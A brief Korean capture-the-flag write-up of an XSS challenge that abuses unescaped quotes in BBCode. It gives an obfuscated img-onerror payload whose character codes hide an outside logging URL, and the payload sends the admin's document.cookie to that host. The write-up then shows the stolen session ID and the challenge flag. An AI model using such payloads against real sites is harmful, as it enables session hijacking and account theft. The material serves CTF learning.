# [2017 Layer7 CTF] DAILY LIFE OF DANIEL - Writeup

## XSS

BBCode에서 `"` 같은 문자들을 escape하지 않는걸 이용한 XSS 문제이다.

어드민의 쿠키를 탈취해서 세션 하이재킹하면 된다.

```
[img]#" onerroorr="location=String.fromCharCode(104,116,116,112,58,47,47,115,97,102,102,108,111,119,101,114,46,107,114,47,108,111,103,46,112,104,112,63,97,61)+document.cookie;[/img]
```
```
PHPSESSID=ttqv4c6o4pine58erbtq1s9cn3
```

___

## Answer

flag: `dlanswpsdjEoTskdy?wharneorlduTdma?`